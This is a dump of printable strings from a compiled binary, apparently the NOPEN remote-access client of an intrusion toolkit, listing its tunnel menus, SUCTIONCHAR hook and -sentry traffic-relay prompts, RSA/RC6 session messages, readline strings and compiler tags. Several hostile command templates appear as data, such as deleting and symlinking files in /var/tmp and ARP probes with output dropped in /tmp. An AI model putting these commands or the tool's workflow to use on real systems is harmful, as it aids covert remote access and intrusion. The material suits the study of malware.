+  [U]dp    listenport [target [port]]
+  [c]lose channel
+  [s]tatus - prints status messages for channels
+  [q]uit   - leaves the tunnel.
+    Please do not hit Ctrl+C, it will cause the tunnels to break
+**** Status of Channels
+%-3d  
+listening 
+on %d for connection to %s:%d
+UDP 
+TCP 
+remote listen on port %d, will connect to %s:%d
+UDP port %u waiting for local connect 
+UDP connected %s:%d  goes to 
+connected %s:%d  goes to 
+%s:%d sent %8d received %8d
+connecting to %s:%d
+closing 
+NOTICE: we are up
+status
+Local listeners
+timeout
+Timeout is too low
+Timeout is %d
+quit
+You still have %d channels open, please close them first
+Start with the remote Listens first:)
+Shutting down NOPEN -tunnel...
+[0;34m
+close
+Bad channel %s
+Channel %d is already closed
+Closing out channel %d
+bad port %s
+bad address %s
+As a note, you should only have one of these up at a time
+bad source port %s
+Unable to create socket
+bind
+Sending to udp port %d
+Connecting UDP on channel %d
+local
+Local
+remote
+listen
+Listen on port %d
+NOTICE: channel %d listen success
+127.0.0.1
+Remote listen on port %d
+safe_write
+Resource issues, sleeping.....
+closing out file descriptor %d
+-tunnel
+Setting up tunnel on port %d
+jscan -ri 127.0.0.1 -rc %d -rs %s & 
+Running: %s
+jscan -ri 127.0.0.1 -rc %d -rs %s %s &
+Starting NOPEN -tunnel...
+Setting up a TCP tunnel mechanism on port %d
+Setting up a UDP tunnel mechanism on port %d
+autoclose
+socket
+accept
+Welcome to NOPEN -tunnel!
+Accepted connection from %s:%d
+NO! tunnel> 
+select
+[%s]
+Shutting down TCP tunnel mechanism
+NOTICE: Connection Attempt success channel %d
+NOTICE: Connection Attempt failed
+NOTICE: Channel %d closed
+Channel closed on remote side, his fd %d
+Channel %d closed [%d bytes sent %d bytes received]
+NOTICE: Closing Channel %d is complete
+Connection from %s:%d to 
+ %s:%d 
+NOTICE: Connection not allowed from remote host
+[0;31m
+UDP packet received from %s remote end
+DO SOMETHING.....
+Connecting on channel %d
+You should not see this guy in the rset %d
+%d-%d-%d:%d:%d:%d
+%d: Invalid month
+[0;31m
+%d: Invalid day
+%d: Invalid year
+%s %d %d:%d:%d %d
+%s: Invalid date
+%d-%d-%d
+%s: no previous directory
+[0;31m
+  PID (PPID)         %d (%d)
+[0;34m
+NHOME
+%s/down/pid
+NOPEN_RHOSTNAME
+%s: %d (%d)
+Local socket closed
+(%u.%u.%u.%u) 
+[0;34m
+  %d.%d s
+  %d.%d ms
+%u.%u.%u.%u:%d -> %u.%u.%u.%u:%d 
+CWR 
+ECN 
+URG 
+SYN 
+ACK 
+PSH 
+RST 
+FIN 
+(port %d closed)
+(port %d open)
+ ICMP Unreachable 
+ ICMP Request 
+ ICMP Reply 
+ Timestamp request 
+ Timestamp reply
+Send    Timestamp: %.2d:%.2d:%.2d UTC
+Receive Timestamp: %.2d:%.2d:%.2d UTC     for (%u.%u.%u.%u)
+ !N 
+ !H 
+ !P 
+ !p 
+Source Route failed
+ICMP_NET_UNKNOWN
+ICMP_HOST_UNKNOWN
+ICMP_HOST_ISOLATED
+ICMP_NET_ANO
+ICMP_HOST_ANO
+ICMP_NET_UNR_TOS
+ICMP_HOST_UNR_TOS
+packet filtered
+ICMP_PREC_VIOLATION
+ICMP_PREC_CUTOFF
+Unable to setup transaction (raw socket problem?)
+[0;31m
+Was unable to get raw icmp socket established
+You may not have permission to do that
+Setting up UDP port %d failed
+Select error, closing down the tunnel
+DONE
+I got a string that was not DONE
+Ping error (Got [8] bytes)
+timebuf is not the size I expect (Got [%d], expected [12] (nBytesRecvd = [%d])
+Receive Timestamp
+echo "%s" | mkoffset -nm
+%2d  
+No Response. UDP port [%d] potentionally open
+h:il:p:r:s:tu
+Could not find target host [%s]
+127.0.0.1
+127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning
+Could not find source host [%s]
+traceroute to %s (using %s), 30 hops max, 38 byte packets
+%2d  
+PQGUNTHVIr:ivp:q:g:u:n:t:d?
+out of memory
+[0;31m
+invalid regular expression
+^[0-9]{2}[A-Za-z]{3}[0-9]{2} [0-2][0-9]:[0-5][0-9]$
+%d%b%y %H:%M
+^[0-9]{12}$
+%Y%m%d%H%M
+^[0-9]{9,10}$
+%%-%ds 
+%%-%du 
+%%%ds %%%ds %%%ds 
+%%%du %%%du %%%du 
+PGID
+PPID
+ST STIME         COMM             CMD
+%-c  %-13s %-16s %-s
+@We don't have an argv...
+%s: Invalid mode.
+[0;31m
+%s: Not a regular file.
+Attempt to put file of size 0.  Use -touch instead.
+[0;34m
+sha1sum %s
+local sha1sum: %s
+Could not perform local sha1sum on %s
+  %s -- %s [%04o]
+  Type "YES" to overwrite> 
+read
+No TCP port specified
+[0;31m
+Using TCP port %hu for the local listener
+[0;34m
+Invalid port %s specified
+socket
+bind
+listen
+noclient: waiting for connection on port %hu
+poll
+noclient: waiting for connection
+; server time is %s
+DONE
+noclient: received DONE, closing transmitter
+accept
+noclient: failed to receive packet: %s
+noclient: waiting to receive %d byte packet
+noclient: received only %d/%d bytes of packet
+noclient: error during packet receive: %s
+noclient: successfully received %d byte packet
+noclient: 
+packet identified as ICMP
+[1;33m
+packet identified as TCP
+packet identified as UDP
+packet not identified
+noclient: server failed to send packet: %s
+noclient: server sent packet successfully
+noclient: sent single packet, closing transmitter
+.sunos
+.solaris
+NHOME
+etc/norc
+%s/%s%s
+%s/%s
+Reading resource file "%s"... 
+[0;34m
+alias
+%s: malformed alias
+[0;31m
+-setenv -q %s
+[0;32m
+Aliases:
+  %s = %s
+WDIR
+WDIR: rc variable not set
+[0;31m
+stty 2506:5:bf:a3b:3:1c:7f:15:4:0:1:0:11:13:1a:0:12:f:17:ff:0:0:2f:0:0:0:0:0:0:0:0:0:0:0:0:0
+[0;34m
+-rlimit get
+...or...
+-rlimit set lim_type soft_lim hard_lim
+lim_types:
+	0. CPU
+	1. DATA
+	2. FSIZE
+	3. NOFILE
+	4. STACK
+soft_lim and hard_lim are unsigned 32-bit integers
+Command sent
+Error in bufrcv
+Reply received
+Soft: %u
+Hard: %u
+Failure for %s
+qinv
+Initiating RSA key exchange
+[0;34m
+  Receiving random number... 
+[0;32m
+  Generating session key... 
+%02X
+  Initializing RC6... 
+  Sending first verify string... 
+  Receiving second verify string... 
+RSA key exchange complete
+Syntax error
+[0;31m
+Variable too long, max is %d
+%s: File has absolute path, type "YES" to delete> 
+Invalid NULL command
+[0;31m
+~#~#~#~
+noclient: failed to execute %s: %s
+noclient: %s exited with status code %d
+noclient: failed to open global_output_file: %s
+DEBUG_MODE
+You are in the wrong place.... bailing
+[0;31m
+SunOS
+5.10
+5.11
+-sentry is only supported on servers running Solaris 2.6+, you are using %s %s
+-sentry is only supported for Solaris 2.6+, you are using %s %s
+Could not find host %s
+-sentry with UDP is broken on Solaris 10. Use -tunnel.
+I didn't receive tcp or udp for protocol, crackpipe is low...
+Port seems a bit wrong, crackpipe is low...
+Device "%s" does not exist
+libnet_init failed: %s
+I don't seem to have an interface to play with
+What is the IP address of the attacking Windows box.  
+[0;34m
+Invalid IP address
+found :
+%x:%x:%x:%x:%x:%x
+his mac looks like %02x:%02x:%02x:%02x:%02x:%02x
+I didn't get a MAC address for %s
+ifconfig %s |grep HWaddr |gawk ' { print $5} '
+ my mac looks like %02x:%02x:%02x:%02x:%02x:%02x
+It probably will not matter
+I will be sending traffic from %s to 
+%s on %s port %d to port %d
+responses will be forwarded to Interface %s
+Couldn't open raw socket; Are you root?
+Hello, this is your interactive Sentry in the box....
+Sending Request to bind remote side
+Remote side bind failed 
+Error code is %d
+Error 2
+Could not do socket on RAW_SOCKET
+Error 3
+Could not do socket on SOCK_DGRAM
+Error 4
+Could not bind to the raw socket
+Error 5
+Could not bind to the normal socket
+Error 6
+Success
+select error
+Setting up eth0:6 interface up as %s
+ifconfig eth0:6 %s netmask 255.255.255.255
+Setting up iptables stuff
+  Nothing to set up
+Everything looks good to start the tunneling
+When you are done, please type DONE.
+init
+Select error, closing down the tunnel
+DONE
+I got a string that was not DONE
+fixed length is %d
+Incomming: 
+Incomming
+Incomming2
+debugging
+libnet_write_link_layer only wrote %d bytes
+construction and injection completed, wrote all %d bytes
+Error from remote side
+This is really weird... 
+Outgoing: 
+debug outgoing: 
+It looks like we timed out, cool
+God A red nugget A fat egg under a dog
+leaving while
+sh -c "ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx "
+3.0.5.2
+Remote noserver doesn't support this command.
+[0;31m
+NHOME
+%s/etc/sha1sums
+Opening sha1sum file "%s"... 
+[0;34m
+[0;32m
+%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X
++ %s %s %s
++ %s
+- %s %s %s 
+[1;33m
+/bin/sh
+Starting NOPEN sub-shell (%s)
+[0;34m
+Can't start the shell, range shutting down
+[0;31m
+Unexpectedly done shelling, range shutting down
+Done shelling, range shutting down
+echo $$
+Invalid PID received
+[0;31m
+Unable to remove /var/tmp/yyserv
+rm -f /var/tmp/yyserv && echo a
+Freeing SUCTIONCHAR stored data
+[0;32m
+free
+free
+Enter a SINGLE filter line
+ERROR
+Error, INVALID filter
+filt
+FILTER saved
+unho
+unho
+End Watching PID
+unpa
+Killed
+unpa
+exit
+exit
+here is the magic string
+file "%s"
+here is the first response
+No response from SUCTIONCHAR.  Is it installed?
+here is the second response
+info
+Error getting SUCTIONCHAR summary information
+info
+-get
+/var/tmp/yyfile
+hook %s%s
+Error, INVALID PID %s
+hook
+Watching PID %s ... use -suc unhook to stop
+Watching PID %s ... Press ENTER to stop.
+got this from shell: %s
+pull
+info
+filter
+blow
+free
+swallow
+unhook
+rm -f /var/tmp/yyserv /var/tmp/yyfile && /bin/ln -s /bin/cat /var/tmp/yyserv && /bin/echo a
+/bin/echo a && /var/tmp/yyserv
+bad2
+Could not start suctionchar.authenticate
+suctionchar.authenticate
+./suctionchar.authenticate
+../bin/suctionchar.authenticate
+/current/bin/suctionchar.authenticate
+SUCTIONCHAR unloaded
+../bin/suctionchar.viewdata
+./suctionchar.viewdata
+suctionchar.viewdata
+/current/bin/suctionchar.viewdata
+Local time according to time():  	%s
+Local time in GMT:               	%s
+Remote time according to time(): 	%s
+Remote time in GMT:              	%s
+UTC_OFFSET=%d
+UTC_OFFSET_SECS=%ds
+UTC Offset (theirs - ours) is %ds
+UTC Offset (theirs - ours) is (%s) %dh %dm %ds
+UTC Offset (theirs - ours) is (%s) %dd %dh %dm %ds
+TERM
+xterm
+COLOR
+[0;31m
+%s: %s
+[0;34m
+%12llu/%12llu %3d%% (%d%%C) 
+%H:%M:%S
+strftime
+ETA: %s %5d kbps
+       
+NOPEN autoport connection closed, switching to fd %d
+Failed to create socket for autoport: %s
+Failed to set socket option for autoport: %s
+listen
+Started NOPEN autoport: 127.0.0.1:%d
+NOPEN_AUTOPORT=%d
+/current/etc/nopen_auto.%d
+noclient: Internal error poll(2)ing the autoport: %s
+[1;33m
+accept
+/current/etc/gs.auto
+-gs %s -nohist
+-gs -nohist %s
+%s: aborted
+Throttling set to %d bps
+[0;34m
+Sleep time may be about %d seconds
+[1;33m
+Throttling disabled
+%s %s
+  Type "YES" to create> 
+%u:%u
+Degas are we not drawn onward no In union drawn onward to new eras aged
+utime
+mtime:
+[0;34m
+atime:
+Uptime: info not available in utmp.
+Uptime: %3d day(s), %2d:%02d:%02d
+USER      TTY       LOGIN@             IDLE       PID
+pBbufrecv: RC6 decryption error: 0x%08x
+[0;31m
+bufsend: bzip2 decompression error: 
+invalid sequence during decompression
+invalid parameter specified
+memory error during compression
+invalid data encountered during decompression
+invalid magic number encountered during decompression
+input/output error
+unexpected end of buffer encountered
+output buffer unexpectedly full
+  SERVER RECEIVED SIGTERM  
+[1;33m
+bufsend: bzip2 compression error: 
+[0;31m
+invalid sequence during compression
+invalid parameter specified
+memory error during compression
+invalid data encountered during compression
+invalid magic number encountered during compression
+input/output error
+unexpected end of buffer encountered
+output buffer unexpectedly full
+bufsend: RC6 encryption error: 0x%08x
+esend() write
+[0;34m
+erecv() read
+socket
+setsockopt
+fcntl
+bind
+connect
+[0;32m
+socket
+setsockopt
+fcntl
+bind
+bind: warning: listening on port %hu
+[1;33m
+listen
+Listening on *:%hu... 
+[0;34m
+%s%u
+%d.%d.%d.%d
+bzip2: error %d
+[0;31m
+TERM
+_*\AaIiCcDdPpYyRrSsXx~
+ hl^$0ftFT;,%wbeWBE|`
+ l|h^0bBFT`
+ l|hwW^0bBFT`
+ l|h^0%bBFT`
+abort
+accept-line
+arrow-key-prefix
+backward-byte
+backward-char
+backward-kill-line
+backward-kill-word
+beginning-of-history
+beginning-of-line
+call-last-kbd-macro
+capitalize-word
+character-search
+character-search-backward
+clear-screen
+copy-backward-word
+copy-forward-word
+copy-region-as-kill
+delete-char-or-list
+delete-horizontal-space
+digit-argument
+do-lowercase-version
+downcase-word
+dump-functions
+dump-macros
+dump-variables
+emacs-editing-mode
+end-kbd-macro
+end-of-history
+end-of-line
+exchange-point-and-mark
+forward-backward-delete-char
+forward-byte
+forward-char
+forward-search-history
+history-search-backward
+history-search-forward
+insert-comment
+insert-completions
+kill-whole-line
+kill-region
+menu-complete
+next-history
+overwrite-mode
+possible-completions
+previous-history
+quoted-insert
+re-read-init-file
+redraw-current-line
+reverse-search-history
+revert-line
+self-insert
+start-kbd-macro
+tab-insert
+transpose-chars
+transpose-words
+tty-status
+undo
+universal-argument
+unix-filename-rubout
+unix-line-discard
+unix-word-rubout
+upcase-word
+yank
+yank-last-arg
+yank-nth-arg
+yank-pop
+vi-append-eol
+vi-append-mode
+vi-arg-digit
+vi-back-to-indent
+vi-bWord
+vi-bword
+vi-change-case
+vi-change-char
+vi-change-to
+vi-char-search
+vi-column
+vi-complete
+vi-delete
+vi-delete-to
+vi-eWord
+vi-editing-mode
+vi-end-word
+vi-eof-maybe
+vi-eword
+vi-fWord
+vi-fetch-history
+vi-first-print
+vi-fword
+vi-goto-mark
+vi-insert-beg
+vi-insertion-mode
+vi-match
+vi-movement-mode
+vi-next-word
+vi-overstrike
+vi-overstrike-delete
+vi-prev-word
+vi-put
+vi-redo
+vi-replace
+vi-rubout
+Do nine men interpret Nine men I nod
+Borrow or rob
+vi-search
+vi-search-again
+vi-set-mark
+vi-subst
+vi-tilde-expand
+vi-yank-arg
+vi-yank-to
+non-incremental-forward-search-history
+non-incremental-reverse-search-history
+non-incremental-forward-search-history-again
+non-incremental-reverse-search-history-again
+warning: turning off output flushing
+--More--
+"\'`@$><=;|&{(
+Display all %d possibilities? (y or n)
+bad value %d for what_to_do in rl_complete
+"%s%s": "%s"
+%s%s outputs %s
+emacs
+none
+audible
+visible
+bind-tty-special-chars
+bell-style
+term=
+mode=
+%s: line %d: %s
+$endif without matching $if
+C-\M-
+blink-matching-paren
+prefer-visible-bell
+unknown parser directive
+no closing `"' in key binding
+prefix-meta
+/etc/inputrc
+INPUTRC
+~/.inputrc
+comment-begin
+completion-query-items
+history-size
+isearch-terminators
+keymap
+\C-%c
+# %s (not bound)
+"%s": %s
+%s is not bound to any keys
+%s can be found on 
+"%s"%s
+set %s %s
+%s is set to `%s'
+Control-
+CTRL-
+Meta
+other
+byte-oriented
+completion-ignore-case
+convert-meta
+disable-completion
+enable-keypad
+expand-tilde
+history-preserve-point
+horizontal-scroll-mode
+input-meta
+mark-directories
+mark-modified-lines
+mark-symlinked-directories
+match-hidden-files
+meta-flag
+output-meta
+page-completions
+revert-all-at-newline
+show-all-if-ambiguous
+show-all-if-unmodified
+visible-stats
+emacs-standard
+emacs-meta
+emacs-ctlx
+vi-move
+vi-command
+vi-insert
+endif
+else
+include
+Escape
+Newline
+Return
+Rubout
+Space
+$else found without matching $if
+completion-prefix-display-length
+print-completions-horizontally
+_rl_col_width: called with MB_CUR_MAX == 1
+debug: insert_some_chars: count (%d) != col (%d)
+/-_=~.#$
+readline: 
+/var/tmp/rltrace.%ld
+readline_callback_read_char() called with no handler!
+COLUMNS
+LINES
+dumb
+LC_ALL
+LC_CTYPE
+LANG
+POSIX
+(arg: %d) 
+%s: out of virtual memory
+xmalloc
+xrealloc
+X%lu
+<>;&|$
+\`"$
+event not found
+bad word specifier
+substitution failed
+unrecognized history modifier
+no previous substitution
+unknown expansion error
+:$*%^
+;&()|<>
+HOME
+Virtual memory exhausted.
+/etc/termcap
+TERMCAP
+tgetent: warning: termcap entry too long
+virtual memory exhausted
+ !"#$%&'()*+,-./01234567
+ !"#$%&'()*+,-./01234567
+DATA
+FSIZE
+NOFILE
+STACK
+sBC}
+Bt3&
+qC>wp>m
+q=^9
+#'ndw*
+Co..K
+dSJ{
+ &wH
+U@IvO
+TLv\E
+^\lC|3
+*vI#n
+#_?i
+US]CQ
+^(BM
+kZ;&
+GCC: (GNU) 2.96 20000731 (Red Hat Linux 7.1 2.96-79)
+GCC: (GNU) 2.96 20000731 (Red Hat Linux 7.1 2.96-79)
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+A Santa lives evil at NASA
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 2.96 20000731 (Red Hat Linux 7.0)
+GCC: (GNU) 2.96 20000731 (Red Hat Linux 7.0)
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 4.5.1
+GCC: (GNU) 2.96 20000731 (Red Hat Linux 7.1 2.96-79)
+01.01
+01.01
+01.01
+01.01
+01.01
+.shstrtab
+.interp
+.note.ABI-tag
+.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.ctors
+.dtors
+.jcr
+.dynamic
+.got
+.got.plt
+.data
+.bss
+.comment
+.note
